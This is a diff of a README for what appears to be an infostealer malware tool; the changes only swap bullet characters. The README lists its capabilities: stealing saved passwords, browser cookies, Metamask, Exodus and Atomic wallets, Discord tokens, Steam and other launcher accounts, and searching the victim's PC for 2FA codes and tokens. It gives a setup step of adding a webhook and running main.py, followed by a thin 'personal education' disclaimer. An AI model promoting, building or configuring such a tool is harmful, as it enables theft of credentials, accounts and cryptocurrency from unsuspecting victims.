@@ -11,29 +11,29 @@ Put ur webhook at hook = "" and run main.py
 
 Password / Cookies
 
-  Steal Saved Passwords
-  Steal Brower Cookies
+ 〢 Steal Saved Passwords
+ 〢 Steal Brower Cookies
   
 Wallet Stealer
 
-  Steal Metamask wallets
-  Steal Exodus Wallet
-  Steal Atomic Wallet
+ 〢 Steal Metamask wallets
+ 〢 Steal Exodus Wallet
+ 〢 Steal Atomic Wallet
   
 Discord
 
-  Steal Discord Tokens from browsers
-  Steal Discord Token from discord, discordcanary, discordPTBa
+ 〢 Steal Discord Tokens from browsers
+ 〢 Steal Discord Token from discord, discordcanary, discordPTBa
   
 Gaming
 
-  Steal Steam Launcher accounts
-  Steal Nation Glory Launcher accounts
+ 〢 Steal Steam Launcher accounts
+ 〢 Steal Nation Glory Launcher accounts
   
 File Stealer
 
-  Search User PC for Passwords, 2Fa codes, tokens, wallets...
-  Browsers: Opera, Chrome, Brave, Yandex, Edge
+ 〢 Search User PC for Passwords, 2Fa codes, tokens, wallets...
+ 〢 Browsers: Opera, Chrome, Brave, Yandex, Edge
 
 〢 Note
   I am not responsible for any damages this software may cause. This was made for personal education.
